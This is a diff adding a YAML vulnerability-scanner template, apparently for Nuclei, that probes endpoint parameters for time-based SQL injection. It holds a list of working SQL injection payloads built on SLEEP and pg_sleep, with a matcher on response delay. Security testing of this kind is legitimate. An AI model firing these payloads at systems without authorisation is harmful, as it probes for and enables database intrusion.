@@ -1,0 +1,40 @@
+id: sqli-time-based
+
+info:
+  name: Time-based SQL Injection 
+  author: mynamegabe
+  severity: critical
+  description: |
+    This template attempts to identify Time-based SQL Injection vulnerabilities in the parameters
+    of the target endpoint by injecting time-delay payloads and measuring response times.
+  metadata:
+    max-request: 3
+  tags: sqli,time,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}||path||?{{param}}={{injection}}"
+
+    attack: pitchfork
+    payloads:
+      injection:
+        - "1' OR SLEEP(5)--"
+        - "1\" OR SLEEP(5)--"
+        - "1' AND SLEEP(5)--"
+        - "1\" AND SLEEP(5)--"
+        - "1) OR pg_sleep(5)--"
+        - "1)) OR pg_sleep(5)--"
+        - "(SELECT(0)FROM(SELECT(SLEEP(7)))a)"
+        - "'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z"
+        - "' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--"
+        - "if(now()=sysdate(),SLEEP(7),0)"
+        - "'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z"
+        - "'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR'Z"
+      param: ./payloads/||pathfile||.txt
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=5"
+        condition: or
